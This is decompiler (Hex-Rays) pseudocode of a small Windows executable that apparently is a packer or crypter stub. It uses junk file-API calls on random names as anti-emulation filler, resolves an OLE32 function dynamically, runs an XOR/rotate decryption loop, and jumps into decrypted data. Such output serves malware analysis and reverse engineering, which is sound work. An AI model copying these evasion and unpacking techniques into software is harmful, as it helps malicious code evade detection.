/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();
_DWORD *__stdcall sub_413E38(unsigned int a1, int a2, _DWORD *a3);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileType(HANDLE hFile);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[9] =
{
  1836548372,
  1337888717,
  2063191756,
  -500959018,
  488909910,
  -1002951488,
  1872968374,
  -552859869,
  -593327921
}; // weak
_UNKNOWN loc_401027; // weak
CHAR a95pb9lfrqnronq[] = "95pB9lFRQnronqxlU3TWIF9De.P0b"; // idb
CHAR aEdfifdaugpocps[] = "edfIfdAuGpOcpS3a0HbaZdP.VKq"; // idb
CHAR aSjtiy6xbswe8ml[] = "SJtiy6xbswe8mlLPpzwhm.Nkj"; // idb
CHAR aUvi8kcmawgjv71[] = "UvI8kcMaWGJv71jKKt9Q.wna"; // idb
WCHAR aJn213yt4k6syah[] = L"\u6E6A\u3132\u5933\u3474\u364B\u5973\u6861\u4869\u5148\u6B77\u722E\u5544"; // idb
WCHAR aA4o95rq2ggdfsx[] = L"\u3441\u396F\u5235\u3271\u4747\u6644\u5853\u634F\u642E\u4B56"; // idb
CHAR aSwg5v4mp0vmpxs[] = "SWG5v4mP0VMPxs8lnLVSv5c.FJI"; // idb
CHAR aWx56hvkiva71ft[] = "wx56HvkIvA7.1FT"; // idb
CHAR LibFileName[] = "OLE32.DLL"; // idb
CHAR FileName[] = "6zC8Jsz.G8R"; // idb
CHAR aKkohi3ivfo0h6m[] = "KkoHI3IVFO0h6m5LzmkerEtm.aqr"; // idb
WCHAR aZr5syvfq5jmob0[] = L"\u727A\u7335\u5659\u5146\u6A35\u4F6D\u3042\u794E\u4F78\u6F66\u7746\u6470\u452E\u5776"; // idb
WCHAR aOklhf0kccszg5n[] = L"\u4B6F\u686C\u3046\u634B\u5343\u477A\u4E35\u7932\u5539\u2E6A\u7842p"; // idb
CHAR aJqTip[] = "Jq.tIp"; // idb
CHAR ProcName[] = "OleSetAutoConvert"; // idb
CHAR aY6azMap[] = "y6AZ.map"; // idb


//----- (0041397C) --------------------------------------------------------
int start()
{
  HANDLE v0; // eax
  int v2; // [esp-8h] [ebp-58h]
  DWORD *v3; // [esp-4h] [ebp-54h]
  HANDLE v4; // [esp+0h] [ebp-50h]
  HANDLE v5; // [esp+4h] [ebp-4Ch]
  HANDLE v6; // [esp+8h] [ebp-48h]
  HRESULT (__stdcall *OleSetAutoConvert)(const IID *const, const IID *const); // [esp+Ch] [ebp-44h]
  int v8; // [esp+14h] [ebp-3Ch]
  HANDLE hFile; // [esp+1Ch] [ebp-34h]
  HMODULE hModule; // [esp+24h] [ebp-2Ch]
  HANDLE v11; // [esp+28h] [ebp-28h]
  HANDLE v12; // [esp+30h] [ebp-20h]
  HANDLE v13; // [esp+34h] [ebp-1Ch]
  void (__cdecl *v14)(HANDLE, HANDLE); // [esp+40h] [ebp-10h]
  HANDLE v15; // [esp+48h] [ebp-8h]
  HANDLE v16; // [esp+4Ch] [ebp-4h]

  hFile = CreateFileA(FileName, 0x80000000, 7u, 0, 3u, 0x182u, 0);
  if ( hFile == (HANDLE)-1 )
  {
    GetFileSize((HANDLE)0xFFFFFFFF, 0);
    CloseHandle((HANDLE)0xFFFFFFFF);
    GetFileSize((HANDLE)0xFFFFFFFF, 0);
    if ( CreateFileA(aWx56hvkiva71ft, 0xE0000000, 4u, 0, 3u, 0x104u, 0) != (HANDLE)-1 )
      goto LABEL_8;
    GetFileSize((HANDLE)0xFFFFFFFF, 0);
    v15 = CreateFileA(aY6azMap, 0x60000000u, 6u, 0, 3u, 4u, 0);
    CloseHandle((HANDLE)0xFFFFFFFF);
    GetLastError();
    CloseHandle((HANDLE)0xFFFFFFFF);
    v4 = CreateFileA(aKkohi3ivfo0h6m, 0xA0000000, 3u, 0, 3u, 0x106u, 0);
    if ( v4 == (HANDLE)-1 )
    {
      GetCommandLineA();
      GetFileSize(v15, 0);
      v13 = CreateFileA(aJqTip, 0xE0000000, 4u, 0, 3u, 0x186u, 0);
      v3 = 0;
      do
      {
        GetFileSize(v15, v3);
        GetCommandLineA();
        GetFileSize(v13, 0);
        v11 = CreateFileW(aJn213yt4k6syah, 0x20000000u, 6u, 0, 3u, 0x100u, 0);
        GetCommandLineA();
        hModule = LoadLibraryA(LibFileName);
        GetLastError();
        GetLastError();
        OleSetAutoConvert = (HRESULT (__stdcall *)(const IID *const, const IID *const))GetProcAddress(hModule, ProcName);
        GetLastError();
        GetLastError();
        v6 = CreateFileA(aSjtiy6xbswe8ml, 0xA0000000, 6u, 0, 3u, 0x120u, 0);
        CreateFileW(aZr5syvfq5jmob0, 0xE0000000, 2u, 0, 3u, 0x185u, 0);
        GetFileSize(v11, 0);
        CloseHandle(hFile);
        CreateFileW(aOklhf0kccszg5n, 0xE0000000, 0, 0, 3u, 0x20u, 0);
        v3 = 0;
        GetCommandLineA();
        v2 = 0;
        CloseHandle(hFile);
        v0 = CreateFileA(aEdfifdaugpocps, 0x80000000, 3u, 0, 3u, 0x1A2u, 0);
LABEL_6:
        ;
      }
      while ( v0 != (HANDLE)-1 );
      v8 = ((int (__cdecl *)(int))OleSetAutoConvert)(v2);
LABEL_8:
      GetFileSize(hFile, 0);
      CreateFileA(a95pb9lfrqnronq, 0x60000000u, 7u, 0, 3u, 0xA2u, 0);
      GetFileType(hFile);
      GetFileType(v6);
      __asm { jmp     [ebp+var_10] }
    }
  }
  else
  {
    v3 = (DWORD *)dword_401000;
    CreateFileA(aSwg5v4mp0vmpxs, 0x60000000u, 5u, 0, 3u, 0x127u, 0);
    v2 = v8;
    CreateFileW(aA4o95rq2ggdfsx, 0x20000000u, 5u, 0, 3u, 0x120u, 0);
    v0 = CreateFileA(aUvi8kcmawgjv71, 0x60000000u, 4u, 0, 3u, 0x1A0u, 0);
    v5 = v0;
    if ( v0 != (HANDLE)-1 )
      goto LABEL_6;
    v14 = (void (__cdecl *)(HANDLE, HANDLE))((char *)sub_413E38 + v8 + 2147024809);
    GetLastError();
  }
  v14(v4, v5);
  GetFileSize(v16, 0);
  GetFileSize(v12, 0);
  return ((int (*)(void))loc_401027)();
}
// 413AE0: variable 'v15' is possibly undefined
// 413AF4: variable 'v13' is possibly undefined
// 413C48: variable 'OleSetAutoConvert' is possibly undefined
// 413CBD: variable 'v6' is possibly undefined
// 413C6E: variable 'v8' is possibly undefined
// 413DE9: variable 'v14' is possibly undefined
// 413DE9: variable 'v4' is possibly undefined
// 413DE9: variable 'v5' is possibly undefined
// 413DF7: variable 'v16' is possibly undefined
// 413E05: variable 'v12' is possibly undefined
// 401000: using guessed type int dword_401000[9];

//----- (00413E38) --------------------------------------------------------
_DWORD *__stdcall sub_413E38(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int v3; // edx
  _DWORD *result; // eax

  v3 = a1 >> 2;
  result = a3;
  do
  {
    *result ^= a2;
    *result = __ROL4__(*result, 70);
    *result ^= a2;
    *result ^= a2;
    *result -= 453580473;
    *result++ -= a2;
    --v3;
  }
  while ( v3 );
  return result;
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
